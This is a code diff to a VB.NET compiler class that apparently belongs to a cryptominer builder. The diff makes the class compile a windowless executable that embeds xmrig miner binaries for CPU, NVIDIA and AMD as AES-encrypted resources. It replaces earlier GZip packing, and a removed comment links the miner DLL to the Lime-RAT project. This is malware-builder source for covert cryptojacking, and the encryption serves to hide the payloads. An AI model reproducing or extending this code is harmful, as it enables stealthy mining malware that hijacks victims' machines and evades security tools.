@@ -1,4 +1,5 @@
 ﻿Imports System.CodeDom.Compiler
+Imports System.Security.Cryptography
 
 Public Class Codedom
     Public Shared OK As Boolean = False
@@ -6,14 +7,10 @@ Public Class Codedom
     Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "")
 
         Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
-        If F.txtDotNET.Text = ".NET 4.0" Then
-            providerOptions.Add("CompilerVersion", "v4.0")
-        Else
-            providerOptions.Add("CompilerVersion", "v2.0")
-        End If
+        providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
+        Dim OP As String = " /target:winexe /platform:x64 /nowarn"
 
         If ICOPath IsNot Nothing Then
             IO.File.Copy(ICOPath, Environment.GetFolderPath(35) + "\icon.ico", True) 'codedom cant read spaces
@@ -29,16 +26,15 @@ Public Class Codedom
             .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             .ReferencedAssemblies.Add("system.dll")
             .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
+            .ReferencedAssemblies.Add("System.Management.dll")
 
             F.txtLog.Text = F.txtLog.Text.Insert(0, "Creating a DLL..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
-                ' XMR DLL source code: https://github.com/NYAN-x-CAT/Lime-RAT/tree/master/Project/Plugins/XMR
-                If F.txtDotNET.Text = ".NET 4.0" Then
-                    R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL4))
-                Else
-                    R.AddResource(F.Resources_DLL, F.GZip(My.Resources.DLL))
-                End If
+                R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
+                R.AddResource(F.Resources_cpu, AES_Encryptor(My.Resources.xmrig))
+                R.AddResource(F.Resources_nvidia, AES_Encryptor(My.Resources.xmrig_nvidia))
+                R.AddResource(F.Resources_amd, AES_Encryptor(My.Resources.xmrig_amd_notls))
                 R.Generate()
             End Using
 
@@ -62,5 +58,18 @@ Public Class Codedom
 
     End Sub
 
+    Public Shared Function AES_Encryptor(ByVal input As Byte()) As Byte()
+        Dim AES As New RijndaelManaged
+        Dim Hash As New MD5CryptoServiceProvider
+        Dim ciphertext As String = ""
+        Try
+            AES.Key = Hash.ComputeHash(System.Text.Encoding.Default.GetBytes(F.AESKEY))
+            AES.Mode = CipherMode.ECB
+            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
+            Dim Buffer As Byte() = input
+            Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
+        Catch ex As Exception
+        End Try
+    End Function
 
 End Class
